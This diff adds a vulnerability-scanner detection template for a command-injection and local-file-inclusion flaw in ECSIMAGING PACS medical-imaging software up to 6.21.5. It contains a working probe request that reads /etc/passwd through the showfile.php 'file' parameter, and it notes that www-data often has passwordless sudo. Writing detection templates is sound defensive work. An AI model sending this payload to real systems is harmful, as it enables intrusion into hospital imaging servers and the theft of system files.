@@ -1,0 +1,27 @@
+id: ecsimagingpacs-rce
+info:
+  name: ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion
+  author: ritikchaddha
+  description: ECSIMAGING PACS Application 6.21.5 and below suffer from a command
+    injection vulnerability and a local file include vulnerability. The 'file' parameter
+    on the page /showfile.php can be exploited to perform command execution or local
+    file inclusion. Often on ECSIMAGING PACS, the www-data user has sudo NOPASSWD
+    access.
+  severity: critical
+  reference: https://www.exploit-db.com/exploits/49388
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    verified: false
+    max-request: 1
+  tags: ecsimagingpacs,rce
+traps:
+- request:
+    method: GET
+    path: /showfile.php?file=/etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
